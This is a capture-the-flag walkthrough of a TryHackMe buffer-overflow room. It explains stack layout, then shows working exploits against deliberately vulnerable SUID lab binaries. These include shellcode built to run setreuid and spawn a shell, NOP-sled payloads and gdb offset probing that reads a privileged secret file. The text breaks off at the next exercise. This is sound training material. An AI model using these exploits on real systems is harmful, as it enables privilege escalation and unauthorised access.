# Buffer Overflows

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Easy
Tags: -
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Premium
Description:
Learn how to get started with basic Buffer Overflows!
```

Room link: [https://tryhackme.com/room/bof1](https://tryhackme.com/room/bof1)

## Solution

### Task 1: Introduction

<img src="Images/CPU.png" alt="CPU" style="width:200px;"/>

In this room, we aim to explore simple stack buffer overflows (without any mitigations) on x86-64 linux programs. We will use [radare2](https://github.com/radare/radare2) (r2) to examine the memory layout. You are expected to be familiar with x86 and r2 for this room.

We have included a virtual machine with all the resources to ensure you have the correct environment and tools to follow along. To access the machine via SSH, use the following credentials:

Username: `user1`  
Password: `user1password`

-----------------------------------------------

[Connect](https://tryhackme.com/access) to our network, deploy the machine and login with the credentials above.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Buffer_Overflows]
└─$ export TARGET_IP=10.66.142.250

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Buffer_Overflows]
└─$ ssh user1@$TARGET_IP            
The authenticity of host '10.66.142.250 (10.66.142.250)' can't be established.
ED25519 key fingerprint is SHA256:AsF56RWYwwHAw06LwzfQZsBY9+GuN1jrYmQRK3FP5dU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.66.142.250' (ED25519) to the list of known hosts.
user1@10.66.142.250's password: 
Last login: Wed Nov 27 21:42:30 2019 from 82.34.52.37

       __|  __|_  )
       _|  (     /   Amazon Linux 2 AMI
      ___|\___|___|

https://aws.amazon.com/amazon-linux-2/
[user1@ip-10-66-142-250 ~]$ 
```

### Task 2: Process Layout

When a program runs on a machine, the computer runs the program as a process. Current computer architecture allows multiple processes to be run concurrently (at the same time by a computer). While these processes may appear to run at the same time, the computer actually switches between the processes very quickly and makes it look like they are running at the same time. Switching between processes is called a context switch. Since each process may need different information to run(e.g. The current instruction to execute), the operating system has to keep track of all the information in a process. The memory in the process is organised sequentially and has the following layout:

![Process Memory Layout](Images/Process_Memory_Layout.png)

- **User stack** contains the information required to run the program. This information would include the current program counter, saved registers and more information (we will go into detail in the next section). The section after the user stack is unused memory and it is used in case the stack grows (downwards)

- **Shared library** regions are used to either statically/dynamically link libraries that are used by the program

- **The heap** increases and decreases dynamically depending on whether a program dynamically assigns memory. Notice there is a section that is unassigned above the heap which is used in the event that the size of the heap increases.

- The program code and data stores the program executable and initialised variables.

-----------------------------------------------

#### Where is dynamically allocated memory stored?

Answer: `heap`

#### Where is information about functions (e.g. local arguments) stored?

Answer: `stack`

### Task 3: x86-64 Procedures

A program would usually comprise of multiple functions and there needs to be a way of tracking which function has been called, and which data is passed from one function to another. The stack is a region of contiguous memory addresses and it is used to make it easy to transfer control and data between functions. The top of the stack is at the lowest memory address and the stack grows towards lower memory addresses. The most common operations of the stack are:

**Pushing**: used to add data onto the stack  
**Popping**: used to remove data from the stack

![Stack Memory 1](Images/Stack_Memory_1.png)

`push var`  
This is the assembly instruction to push a value onto the stack. It does the following:

- Uses var or value stored in memory location of var

![Stack Memory 2](Images/Stack_Memory_2.png)

- Decrements the stack pointer (known as `rsp`) by 8
- Writes above value to new location of `rsp`, which is now the top of the stack

![Stack Memory 3](Images/Stack_Memory_3.png)

`pop var`  
This is an assembly instruction to read a value and pop it off the stack. It does the following:

- Reads the value at the address given by the stack pointer

![Stack Memory 4](Images/Stack_Memory_4.png)

- Store the value that was read from `rsp` into var
- Increment the stack pointer by 8

![Stack Memory 5](Images/Stack_Memory_5.png)

It’s important to note that the memory does not change when popping values of the stack - it is only the value of the stack pointer that changes!

Each compiled program may include multiple functions, where each function would need to store local variables, arguments passed to the function and more. To make this easy to manage, each function has its own separate stack frame, where each new stack frame is allocated when a function is called, and deallocated when the function is complete.

![Stack Memory 6](Images/Stack_Memory_6.png)

This is easily explained using an example. Look at the two functions:

```c
int add(int a, int b) {
   int new = a + b;
   return new;
}

int calc(int a, int b) {
   int final = add(a, b);
   return final;
}

calc(4, 5)
```

-----------------------------------------------

#### What direction does the stack grow? (lower/higher), use the symbol "l" to represent lower and the symbol "h" to represent higher

Answer: `l`

#### What instruction is used to add data onto the stack?

Answer: `push`

### Task 4: Procedures Continued

The explanation assumes that the current point of execution is inside the calc function. In this case calc is known as the *caller* function and add is known as the *callee* function. The following presents the assembly code inside the calc function

![Function call example 1](Images/Function_call_example_1.png)

![Stack Memory 7](Images/Stack_Memory_7.png)

The add function is invoked using the call operand in assembly, in this case `callq sym.add`. The call operand can either take a label as an argument (e.g. A function name), or it can take a memory address as an offset to the location of the start of the function in the form of call *value. Once the add function is invoked (and after it is completed), the program would need to know what point to continue in the program. To do this, the computer pushes the address of the next instruction onto the stack, in this case the address of the instruction on the line that contains `movl %eax, local_4h`. After this, the program would allocate a stack frame for the new function, change the current instruction pointer to the first instruction in the function, change the stack pointer (`rsp`) to the top of the stack, and change the frame pointer (`rbp`) to point to the start of the new frame.

![Function call example 2](Images/Function_call_example_2.png)

![Stack Memory 8](Images/Stack_Memory_8.png)

Once the function is finished executing, it will call the return instruction (`retq`). This instruction will pop the value of the return address of the stack, deallocate the stack frame for the add function, change the instruction pointer to the value of the return address, change the stack pointer (`rsp`) to the top of the stack and change the frame pointer (`rbp`) to the stack frame of calc.

![Stack Memory 9](Images/Stack_Memory_9.png)

![Function call example 3](Images/Function_call_example_3.png)

Now that we’ve understood how control is transferred through functions, let’s look at how data is transferred.

In the above example, we save that functions take arguments. The calc function takes 2 arguments (a and b). Upto 6 arguments for functions can be stored in the following registers:

- `rdi`
- `rsi`
- `rdx`
- `rcx`
- `r8`
- `r9`

**Note**: `rax` is a special register that stores the **return values** of the functions (if any).

If a function has anymore arguments, these arguments would be stored on the functions stack frame.

We can now see that a caller function may save values in their registers, but what happens if a callee function also wants to save values in the registers? To ensure the values are not overwritten, the callee values first save the values of the registers on their stack frame, use the registers and then load the values back into the registers. The caller function can also save values on the caller function frame to prevent the values from being overwritten. Here are some rules around which registers are caller and callee saved:

- `rax` is caller saved
- `rdi`, `rsi`, `rdx`, `rcx`, `r8` and `r9` are called saved (and they are usually arguments for functions)
- `r10`, `r11` are caller saved
- `rbx`, `r12`, `r13`, `r14` are callee saved
- `rbp` is also callee saved (and can be optionally used as a frame pointer)
- `rsp` is callee saved

So far, this is a more thorough example of the run time stack:

![Stack Memory 10](Images/Stack_Memory_10.png)

-----------------------------------------------

#### What register stores the return address?

Answer: `rax`

### Task 5: Endianess

In the above programs, you can see that the binary information is represented in hexadecimal format. Different architectures actually represent the same hexadecimal number in different ways, and this is what is referred to as Endianess. Let’s take the value of 0x12345678 as an example. Here the least significant value is the right most value (78) while the most significant value is the left most value (12).

**Little Endian** is where the value is arranged from the least significant byte to the most significant byte:

![Little Endian](Images/Little_Endian.png)

**Big Endian** is where the value is arranged from the most significant byte to the least significant byte.

![Big Endian](Images/Big_Endian.png)

Here, each “value” requires at least a byte to represent, as part of a multi-byte object.

-----------------------------------------------

### Task 6: Overwriting Variables

Now that we’ve looked at all the background information, let’s explore how the overflows actually work. If you take a look at the overflow-1 folder, you’ll notice some C code with a binary program. Your goal is to change the value of the integer variable.

![Buffer Overflow Example 1](Images/Buffer_Overflow_Example_1.png)

From the C code you can see that the integer variable and character buffer have been allocated next to each other - since memory is allocated in contiguous bytes, you can assume that the integer variable and character buffer are allocated next to each other.

**Note**: this may not always be the case. With how the compiler and stack are configured, when variables are allocated, they would need to be aligned to particular size boundaries (e.g. 8 bytes, 16 byte) to make it easier for memory allocation/deallocation. So if a 12 byte array is allocated where the stack is aligned for 16 bytes this is what the memory would look like:

![Stack Memory 11](Images/Stack_Memory_11.png)

the compiler would automatically add 4 bytes to ensure that the size of the variable aligns with the stack size. From the image of the stack above, we can assume that the stack frame for the main function looks like this:

![Stack Memory 12](Images/Stack_Memory_12.png)

even though the stack grows downwards, when data is copied/written into the buffer, it is copied from lower to higher addresess. Depending on how data is entered into the buffer, it means that it's possible to overwrite the integer variable. From the C code, you can see that the gets function is used to enter data into the buffer from standard input. The gets function is dangerous because it doesn't really have a length check - This would mean that you can enter more than 14 bytes of data, which would then overwrite the integer variable.

Try run the C program in this folder to overwrite the above variable!

-----------------------------------------------

#### What is the minimum number of characters needed to overwrite the variable?

Hint: Send different amounts of characters as input until you get the right number of characters

```bash
[user1@ip-10-66-142-250 overflow-1]$ python -c "print 'A'*12" | ./int-overflow 
Try again?
[user1@ip-10-66-142-250 overflow-1]$ python -c "print 'A'*13" | ./int-overflow 
Try again?
[user1@ip-10-66-142-250 overflow-1]$ python -c "print 'A'*14" | ./int-overflow 
Try again?
[user1@ip-10-66-142-250 overflow-1]$ python -c "print 'A'*15" | ./int-overflow 
You have changed the value of the variable
[user1@ip-10-66-142-250 overflow-1]$ 
```

Answer: `15`

### Task 7: Overwriting Function Pointers

For this example, look at the overflow- 2 folder. Inside this folder, you’ll notice the following C code.

![Buffer Overflow Example 2](Images/Buffer_Overflow_Example_2.png)

Similar to the example above, data is read into a buffer using the gets function, but the variable above the buffer is not a pointer to a function. A pointer, like its name implies, is used to point to a memory location, and in this case the memory location is that of the normal function. The stack is laid out similar to the example above, but this time you have to find a way of invoking the special function (maybe using the memory address of the function). Try invoke the special function in the program.

Keep in mind that the architecture of this machine is little endian!

-----------------------------------------------

#### Invoke the special function()

Hint: check the memory address of the function!

First we find out the virtual memory address of the `special` function.

This can be done with `objdump`

```bash
[user1@ip-10-64-146-64 overflow-2]$ objdump -t func-pointer | grep special
0000000000400567 g     F .text  000000000000001b              special
[user1@ip-10-64-146-64 overflow-2]$ 
```

Or gdb

```bash
[user1@ip-10-64-146-64 overflow-2]$ gdb -batch -ex 'info func' func-pointer | grep special
0x0000000000400567  special
[user1@ip-10-64-146-64 overflow-2]$ 
```

The memory address is 0x0000000000400567, but we need to keep in mind the endianess.

Then we find out the offset to the return adress.

From the source we can see that the `buffer` is `14` bytes. Let's try that as offset (padding).

```bash
[user1@ip-10-64-146-64 overflow-2]$ python -c "print 'A'*14 + '\x67\x05\x40\x00\x00\x00\x00\x00'" | ./func-pointer 
this is the special function
you did this, friend!
[user1@ip-10-64-146-64 overflow-2]$ 
```

### Task 8: Buffer Overflows

For this example, look at overflow-3 folder. Inside this folder, you’ll find the following C code.

![Buffer Overflow Example 3](Images/Buffer_Overflow_Example_3.png)

This example will cover some of the more interesting, and useful things you can do with a buffer overflow. In the previous examples, we’ve seen that when a program takes users controlled input, it may not check the length, and thus a malicious user could overwrite values and actually change variables.

In this example, in the copy_arg function we can see that the strcpy function is copying input from a string (which is argv[1] which is a command line argument) to a buffer of length 140 bytes. With the nature of strcpy, it does not check the length of the data being input so here it’s also possible to overflow the buffer - we can do something more malicious here.

Let’s take a look at what the stack will look like for the copy_arg function(this stack excludes the stack frame for the strcpy function):

![Stack Memory 13](Images/Stack_Memory_13.png)

Earlier, we saw that when a function (in this case main) calls another function (in this case copy_args), it needs to add the return address on the stack so the callee function (copy_args) knows where to transfer control to once it has finished executing. From the stack above, we know that data will be copied upwards from buffer[0] to buffer[140]. Since we can overflow the buffer, it also follows that we can overflow the return address with our own value. We can control where the function returns and change the flow of execution of a program (very cool, right?)

Know that we know we can control the flow of execution by directing the return address to some memory address, how do we actually do something useful with this. This is where shellcode comes in; shell code quite literally is code that will open up a shell. More specifically, it is binary instructions that can be executed. Since shellcode is just machine code (in the form of binary instructions), you can usually start of by writing a C program to do what you want, compile it into assembly and extract the hex characters(alternatively it would involve writing your own assembly). For now we’ll use this shellcode that opens up a basic shell:

`\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05`

So why don’t we looking at actually executing this shellcode. The basic idea is that we need to point the overwritten return address to the shellcode, but where do we actually store the shellcode and what actual address do we point it at? Why don’t we store the shellcode in the buffer - because we know the address at the beginning of the buffer, we can just overwrite the return address to point to the start of the buffer. Here’s the general process so far:

- Find out the address of the start of the buffer and the start address of the return address
- Calculate the difference between these addresses so you know how much data to enter to overflow
- Start out by entering the shellcode in the buffer, entering random data between the shellcode and the return address, and the address of the buffer in the return address

![Stack Memory 14](Images/Stack_Memory_14.png)

In theory, this looks like it would work quite well. However, memory addresses may not be the same on different systems, even across the same computer when the program is recompiled. So we can make this more flexible using a *NOP instruction*. A NOP instruction is a no operation instruction - when the system processes this instruction, it does nothing, and carries on execution. A NOP instruction is represented using `\x90`. Putting NOPs as part of the payload means an attacker can jump anywhere in the memory region that includes a NOP and eventually reach the intended instructions. This is what an injection vector would look like:

![Stack Memory 15](Images/Stack_Memory_15.png)

You’ve probably noticed that shellcode, memory addresses and NOP sleds are usually in hex code. To make it easy to pass the payload to an input program, you can use python:

`python -c “print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)”`

Using this format would be something like this for this challenge:

`python -c "print('\x90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 + '\xef\xbe\xad\xde')" | ./program_name`

In some cases you may need to pass `xargs` before ./program_name.

-----------------------------------------------

#### Use the above method to open a shell and read the contents of the secret.txt file

We start by checking the files and their permissions

```bash
[user1@ip-10-64-146-64 overflow-3]$ ls -l
total 20
-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
[user1@ip-10-64-146-64 overflow-3]$ 
```

We have a SUID-binary `buffer-overflow` owned by `user2` and the `secret.txt` is also owned, and only readable by, `user2`.

The UID for `user2` is `1002`

```bash
[user1@ip-10-64-146-64 overflow-3]$ cat /etc/passwd | grep user
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
ec2-user:x:1000:1000:EC2 Default User:/home/ec2-user:/bin/bash
user1:x:1001:1001::/home/user1:/bin/bash
user2:x:1002:1002::/home/user2:/bin/bash
user3:x:1003:1003::/home/user3:/bin/bash
[user1@ip-10-64-146-64 overflow-3]$ 
```

The provided shellcode looks like this

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Buffer_Overflows]
└─$ source ~/Python_venvs/PwnTools/bin/activate

┌──(PwnTools)─(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Buffer_Overflows]
└─$ python                                      
Python 3.13.2 (main, Feb  5 2025, 01:23:35) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> print(disasm(b'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'))
   0:   48                      dec    eax
   1:   b9 2f 62 69 6e          mov    ecx, 0x6e69622f
   6:   2f                      das
   7:   73 68                   jae    0x71
   9:   11 48 c1                adc    DWORD PTR [eax-0x3f], ecx
   c:   e1 08                   loope  0x16
   e:   48                      dec    eax
   f:   c1 e9 08                shr    ecx, 0x8
  12:   51                      push   ecx
  13:   48                      dec    eax
  14:   8d 3c 24                lea    edi, [esp]
  17:   48                      dec    eax
  18:   31 d2                   xor    edx, edx
  1a:   b0 3b                   mov    al, 0x3b
  1c:   0f 05                   syscall
>>> exit

┌──(PwnTools)─(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Buffer_Overflows]
└─$ 
```

but with the special requirements for the UID above, we will create our own shellcode with Pwntools shellcraft module.

```bash
┌──(PwnTools)─(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Buffer_Overflows]
└─$ python
Python 3.13.2 (main, Feb  5 2025, 01:23:35) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> context(arch='amd64', os='linux')
>>> shellcode = asm(
... shellcraft.setreuid(1002) +
... shellcraft.sh())
>>> print(shellcode)
b'1\xfff\xbf\xea\x03jqXH\x89\xfe\x0f\x05jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
>>> print(disasm(shellcode))
   0:   31 ff                   xor    edi, edi
   2:   66 bf ea 03             mov    di, 0x3ea
   6:   6a 71                   push   0x71
   8:   58                      pop    rax
   9:   48 89 fe                mov    rsi, rdi
   c:   0f 05                   syscall
   e:   6a 68                   push   0x68
  10:   48 b8 2f 62 69 6e 2f 2f 2f 73   movabs rax, 0x732f2f2f6e69622f
  1a:   50                      push   rax
  1b:   48 89 e7                mov    rdi, rsp
  1e:   68 72 69 01 01          push   0x1016972
  23:   81 34 24 01 01 01 01    xor    DWORD PTR [rsp], 0x1010101
  2a:   31 f6                   xor    esi, esi
  2c:   56                      push   rsi
  2d:   6a 08                   push   0x8
  2f:   5e                      pop    rsi
  30:   48 01 e6                add    rsi, rsp
  33:   56                      push   rsi
  34:   48 89 e6                mov    rsi, rsp
  37:   31 d2                   xor    edx, edx
  39:   6a 3b                   push   0x3b
  3b:   58                      pop    rax
  3c:   0f 05                   syscall
>>> print(len(shellcode))
62
>>> exit
```

The shellcode is 62 bytes in length and:

- makes sure our UID is right (`1002`) with `setreuid`
- executes a shell (`/bin/sh`)

Now for the exploitation phase.

We begin the exploitation by finding out the offset to the return address. We start with something a bit larger than the size of the `buffer` which is `140` bytes.

```bash
[user1@ip-10-64-146-64 overflow-3]$ gdb -q ./buffer-overflow
Reading symbols from ./buffer-overflow...(no debugging symbols found)...done.
(gdb) run $(python -c "print 'A'*150")
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print 'A'*150")
Missing separate debuginfos, use: debuginfo-install glibc-2.26-64.amzn2.0.5.x86_64
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400595 in main ()
(gdb) run $(python -c "print 'A'*151")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print 'A'*151")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGBUS, Bus error.
0x0000000000400595 in main ()
(gdb) run $(python -c "print 'A'*152")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print 'A'*152")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGILL, Illegal instruction.
0x0000000000400500 in __do_global_dtors_aux ()
(gdb) run $(python -c "print 'A'*153")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print 'A'*153")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400041 in ?? ()
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print 'A'*158")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
(gdb) run $(python -c "print 'A'*159")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print 'A'*159")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400563 in copy_arg ()
(gdb) 
```

So the offset is `152` bytes and the total payload should be `158` bytes.

Note that the Python version is an old 2.7 one so we don't need parentheses for the `print` statement

```bash
[user1@ip-10-64-146-64 overflow-3]$ python -V
Python 2.7.18
[user1@ip-10-64-146-64 overflow-3]$ 
```

We will create our payload as:

- NOP-sledge (Opcode 90), 48 bytes
- Shellcode, 62 bytes
- Padding ('A'), 42 bytes
- Memory address, 6 bytes

Total size: 158 bytes

Next, we check for a good memory adress to point to

```bash
[user1@ip-10-64-146-64 overflow-3]$ gdb -q ./buffer-overflow
Reading symbols from ./buffer-overflow...(no debugging symbols found)...done.
(gdb) run $(python -c "print '\x90'*48 + 'S'*62 + 'A'*42 + 'B'*6")Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print '\x90'*48 + 'S'*62 + 'A'*42 + 'B'*6")
Missing separate debuginfos, use: debuginfo-install glibc-2.26-64.amzn2.0.5.x86_64
Here's a program that echo's out your input
������������������������������������������������SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()
(gdb) x/32gx $rsp-200
0x7fffffffe228: 0x0000000000400450      0x00007fffffffe3e0
0x7fffffffe238: 0x0000000000400561      0x00007ffff7dcf8c0
0x7fffffffe248: 0x00007fffffffe653      0x9090909090909090
0x7fffffffe258: 0x9090909090909090      0x9090909090909090
0x7fffffffe268: 0x9090909090909090      0x9090909090909090
0x7fffffffe278: 0x9090909090909090      0x5353535353535353
0x7fffffffe288: 0x5353535353535353      0x5353535353535353
0x7fffffffe298: 0x5353535353535353      0x5353535353535353
0x7fffffffe2a8: 0x5353535353535353      0x5353535353535353
0x7fffffffe2b8: 0x4141535353535353      0x4141414141414141
0x7fffffffe2c8: 0x4141414141414141      0x4141414141414141
0x7fffffffe2d8: 0x4141414141414141      0x4141414141414141
0x7fffffffe2e8: 0x0000424242424242      0x00007fffffffe3e8
0x7fffffffe2f8: 0x0000000200000000      0x00000000004005a0
0x7fffffffe308: 0x00007ffff7a4d13a      0x00007ffff7dcf788
0x7fffffffe318: 0x00007fffffffe3e8      0x00000002f7b9c708
(gdb) quit
A debugging session is active.

        Inferior 1 [process 18849] will be killed.

Quit anyway? (y or n) y
[user1@ip-10-64-146-64 overflow-3]$ 
```

An address around the middle of the NOP-sledge is `0x7fffffffe260`.

We test it out in GDB

```bash
[user1@ip-10-64-146-64 overflow-3]$ gdb -q ./buffer-overflow
Reading symbols from ./buffer-overflow...(no debugging symbols found)...done.
(gdb) run $(python -c "print '\x90'*48 + '1\xfff\xbf\xea\x03jqXH\x89\xfe\x0f\x05jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05' + 'A'*42 + '\x60\xe2\xff\xff\xff\x7f'") 
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print '\x90'*48 + '1\xfff\xbf\xea\x03jqXH\x89\xfe\x0f\x05jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05' + 'A'*42 + '\x60\xe2\xff\xff\xff\x7f'")
Missing separate debuginfos, use: debuginfo-install glibc-2.26-64.amzn2.0.5.x86_64
Here's a program that echo's out your input
������������������������������������������������1�f��jqXH��jhH�/bin///sPH��hri�4$1�V^H�VH��1�j;XAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`����
process 18861 is executing new program: /usr/bin/bash
sh-4.2$ id
Detaching after fork from child process 18867.
uid=1001(user1) gid=1001(user1) groups=1001(user1)
sh-4.2$ exit
exit
[Inferior 1 (process 18861) exited normally]
Missing separate debuginfos, use: debuginfo-install bash-4.2.46-30.amzn2.x86_64
(gdb) quit
[user1@ip-10-64-146-64 overflow-3]$ 
```

Let's try it without GDB so we can get the flag

```bash
[user1@ip-10-64-146-64 overflow-3]$ /home/user1/overflow-3/buffer-overflow $(python -c "print '\x90'*48 + '1\xfff\xbf\xea\x03jqXH\x89\xfe\x0f\x05jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05' + 'A'*42 + '\x60\xe2\xff\xff\xff\x7f'") 
Here's a program that echo's out your input
������������������������������������������������1�f��jqXH��jhH�/bin///sPH��hri�4$1�V^H�VH��1�j;XAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`����
sh-4.2$ id
uid=1002(user2) gid=1001(user1) groups=1001(user1)
sh-4.2$ cat secret.txt 
omgyoudidthissocool!!
sh-4.2$ exit
exit
[user1@ip-10-64-146-64 overflow-3]$ 
```

Note that the `buffer-overflow` program is called with its full path!

### Task 9: Buffer Overflow 2

Look at the overflow-4 folder. Try to use your newly learnt buffer overflow techniques for this binary file.

-----------------------------------------------

#### Use the same method to read the contents of the secret file

We start by checking the files and their permissions

```bash
[user1@ip-10-64-146-64 overflow-4]$ ls -l
total 20
-rwsr-xr-x 1 user3 user3 8272 Sep  3  2019 buffer-overflow-2
-rw-rw-r-- 1 user1 user1  250 Sep  3  2019 buffer-overflow-2.c
-rw------- 1 user3 user3   17 Sep  2  2019 secret.txt
[user1@ip-10-64-146-64 overflow-4]$ 
```

We have a SUID-binary `buffer-overflow-2` owned by `user3` and the `secret.txt` is also owned, and only readable by, `user3`.

The UID for `user3` is `1003`

```bash
[user1@ip-10-64-146-64 overflow-4]$ cat /etc/passwd | grep user
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
ec2-user:x:1000:1000:EC2 Default User:/home/ec2-user:/bin/bash
user1:x:1001:1001::/home/user1:/bin/bash
user2:x:1002:1002::/home/user2:/bin/bash
user3:x:1003:1003::/home/user3:/bin/bash
[user1@ip-10-64-146-64 overflow-4]$ 
```

The C source file is similar but with a slightly larger buffer

```bash
[user1@ip-10-64-146-64 overflow-4]$ cat buffer-overflow-2.c 
#include <stdio.h>
#include <stdlib.h>

void concat_arg(char *string)
{
    char buffer[154] = "doggo";
    strcat(buffer, string);
    printf("new word is %s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    concat_arg(argv[1]);
}
[user1@ip-10-64-146-64 overflow-4]$ 
```

We will use a similar shellcode as before but with a different UID

```bash
┌──(PwnTools)─(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Buffer_Overflows]
└─$ python                                     
Python 3.13.2 (main, Feb  5 2025, 01:23:35) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> context(arch='amd64', os='linux')
>>> shellcode = asm(
... shellcraft.setreuid(1003) +
... shellcraft.sh())
>>> print(len(shellcode))
62
>>> print(disasm(shellcode))
   0:   31 ff                   xor    edi, edi
   2:   66 bf eb 03             mov    di, 0x3eb
   6:   6a 71                   push   0x71
   8:   58                      pop    rax
   9:   48 89 fe                mov    rsi, rdi
   c:   0f 05                   syscall
   e:   6a 68                   push   0x68
  10:   48 b8 2f 62 69 6e 2f 2f 2f 73   movabs rax, 0x732f2f2f6e69622f
  1a:   50                      push   rax
  1b:   48 89 e7                mov    rdi, rsp
  1e:   68 72 69 01 01          push   0x1016972
  23:   81 34 24 01 01 01 01    xor    DWORD PTR [rsp], 0x1010101
  2a:   31 f6                   xor    esi, esi
  2c:   56                      push   rsi
  2d:   6a 08                   push   0x8
  2f:   5e                      pop    rsi
  30:   48 01 e6                add    rsi, rsp
  33:   56                      push   rsi
  34:   48 89 e6                mov    rsi, rsp
  37:   31 d2                   xor    edx, edx
  39:   6a 3b                   push   0x3b
  3b:   58                      pop    rax
  3c:   0f 05                   syscall
>>> print(shellcode)
b'1\xfff\xbf\xeb\x03jqXH\x89\xfe\x0f\x05jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
>>> exit
```

We check the offset

```bash
[user1@ip-10-64-146-64 overflow-4]$ gdb -q ./buffer-overflow-2
Reading symbols from ./buffer-overflow-2...(no debugging symbols found)...done.
(gdb) run $(python -c "print 'A'*160")
